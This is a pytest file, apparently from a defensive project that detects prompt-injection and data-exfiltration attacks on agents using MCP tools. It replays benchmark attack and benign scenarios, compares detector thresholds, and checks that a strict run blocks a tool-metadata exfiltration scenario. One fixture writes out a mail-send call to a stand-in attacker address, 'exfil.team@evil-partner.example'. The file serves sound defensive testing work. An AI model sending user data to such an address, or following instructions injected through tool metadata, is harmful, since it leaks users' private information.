"""Offline replay of cached runs, and the calibration script's selection rule."""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path
from types import ModuleType

from provmcp.agent.backends import ScriptedBackend
from provmcp.agent.experiment import run_suite
from provmcp.agent.replay import ReplayedEpisode, render_replay_report, replay_all
from provmcp.agent.runner import CallRecord, EpisodeResult, run_episode
from provmcp.benchmark import Scenario, load_scenario, load_scenarios
from provmcp.config import DetectionConfig
from tests.test_live_enforcement import CD003, REPO

MSB = REPO / "benchmarks" / "msb"
CALIBRATED = DetectionConfig(
    thresholds={"substring": 0.428, "structured": 0.85}, track_tool_metadata=True
)
WEEK7 = DetectionConfig(thresholds={}, track_tool_metadata=False)


def _load_script() -> ModuleType:
    path = REPO / "scripts" / "calibrate_detectors.py"
    spec = importlib.util.spec_from_file_location("calibrate_detectors", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module  # dataclasses look the module up here
    spec.loader.exec_module(module)
    return module


async def _scripted_cache(tmp_path: Path) -> tuple[list[EpisodeResult], dict[str, Scenario]]:
    scenarios = [
        s for d in ("attacks", "msb", "benign") for s in load_scenarios(REPO / "benchmarks" / d)
    ]
    results = await run_suite(
        scenarios,
        ScriptedBackend.from_scenario,
        model="scripted",
        conditions=["audit"],
        workroot=tmp_path,
        concurrency=4,
    )
    return results, {s.id: s for s in scenarios}


async def test_replay_matches_what_the_live_proxy_flagged(tmp_path: Path) -> None:
    results, scenarios = await _scripted_cache(tmp_path)
    replayed = {r.scenario_id: r for r in replay_all(results, scenarios, DetectionConfig())}
    for live in results:
        assert replayed[live.scenario_id].flagged_calls == sum(c.findings > 0 for c in live.calls)


async def test_calibrated_settings_detect_more_with_the_same_alarms(tmp_path: Path) -> None:
    results, scenarios = await _scripted_cache(tmp_path)
    week7 = replay_all(results, scenarios, WEEK7)
    week9 = replay_all(results, scenarios, CALIBRATED)

    def detected(eps: list[ReplayedEpisode]) -> int:
        return sum(e.flagged_goal for e in eps if e.is_attack and e.attempted)

    def alarms(eps: list[ReplayedEpisode]) -> int:
        return sum(e.false_alarm for e in eps)

    assert detected(week9) > detected(week7)
    assert alarms(week9) == alarms(week7) == 3  # bn-004, bn-005, bn-009: intended flows
    report = render_replay_report(week9, title="t", settings={})
    assert "| **all** | 27 | 10 | 3 | 30.0% | 17 |" in report


async def test_live_strict_run_blocks_att08_with_tool_metadata(tmp_path: Path) -> None:
    scenario = load_scenario(MSB / "msb_att08_tool_metadata_exfil.json")
    plain = await run_episode(
        scenario,
        ScriptedBackend.from_scenario(scenario),
        condition="strict",
        workdir=tmp_path / "plain",
        detection=WEEK7,
    )
    tracked = await run_episode(
        scenario,
        ScriptedBackend.from_scenario(scenario),
        condition="strict",
        workdir=tmp_path / "tracked",
        detection=CALIBRATED,
    )
    assert plain.succeeded and not plain.flagged_goal
    assert tracked.blocked_goal and not tracked.succeeded


def test_false_alarm_counts_only_non_attack_traffic() -> None:
    def episode(is_attack: bool, attempted: bool, flagged: int) -> ReplayedEpisode:
        return ReplayedEpisode(
            "s", "g", "audit", 0, is_attack, attempted, calls=2, flagged_calls=flagged
        )

    assert episode(False, False, 1).false_alarm
    assert episode(True, False, 1).false_alarm  # attack not attempted: benign traffic
    assert not episode(True, True, 1).false_alarm
    assert not episode(False, False, 0).false_alarm


def test_replay_skips_content_of_blocked_calls() -> None:
    scenario = load_scenario(CD003)
    blocked_read = CallRecord(1, "calendar", "get_next_event", {}, "block", 0, False)
    send = CallRecord(
        2, "email", "send", {"to": "exfil.team@evil-partner.example"}, "pass", 0, True
    )
    result = EpisodeResult(scenario.id, "g", "audit", "b", "m", 0, True, calls=[blocked_read, send])
    replayed = replay_all([result], {scenario.id: scenario}, WEEK7)
    assert replayed[0].flagged_calls == 0  # nothing was recorded from the calendar


def test_choose_maximizes_j_and_prefers_the_higher_threshold() -> None:
    script = _load_script()
    attacks = [
        Scenario(id=f"a{i}", title="", servers=[], ground_truth="cross_server_influence")
        for i in range(3)
    ]
    benign = [Scenario(id=f"b{i}", title="", servers=[], ground_truth="benign") for i in range(2)]
    scores = {"a0": 0.9, "a1": 0.5, "a2": 0.0, "b0": 0.5, "b1": 0.0}
    threshold, j = script.choose(scores, attacks + benign)
    # 0.9 gives J = 1/3 - 0; 0.5 gives J = 2/3 - 1/2 = 1/6.
    assert threshold == 0.9 and abs(j - 1 / 3) < 1e-9
    assert script.floor3(0.42857) == 0.428


def test_calibration_reproduces_the_saved_thresholds(tmp_path: Path) -> None:
    out = tmp_path / "cal.json"
    subprocess.run(
        [
            sys.executable,
            str(REPO / "scripts" / "calibrate_detectors.py"),
            "--json",
            str(out),
            "--skip-embedding",
        ],
        check=True,
        capture_output=True,
        cwd=REPO,
    )
    fresh = json.loads(out.read_text())
    saved = json.loads((REPO / "docs" / "results" / "calibration-week9.json").read_text())
    for name in ("substring", "structured"):
        assert fresh["thresholds"][name] == saved["thresholds"][name]
    assert fresh["substring_score"] == saved["substring_score"]
